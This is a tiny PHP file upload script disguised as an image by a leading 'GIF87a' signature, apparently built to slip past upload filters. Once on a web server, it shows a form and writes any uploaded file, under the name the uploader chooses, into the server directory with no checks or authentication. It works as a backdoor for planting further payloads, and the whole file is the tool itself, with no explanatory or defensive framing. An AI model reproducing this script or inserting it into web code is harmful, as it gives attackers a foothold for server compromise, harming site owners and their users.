GIF87a
<?
$path = $_FILES ['upload'] ['tmp_name'] ;
$name = $_FILES ['upload'] ['name'];
$error = $_FILES ['upload'] ['error'];
$xx = "/";

if ($_POST['submit']){
	
	move_uploaded_file ($path,$name);
	
	echo "File Uploaded Success ==> ".$name;
	}
else {	
echo '
<form action="" method="post" enctype="multipart/form-data">
<input type="file" name="upload">
<input type="submit" name="submit" value="Upload Now">
</form>
';
	}
?>
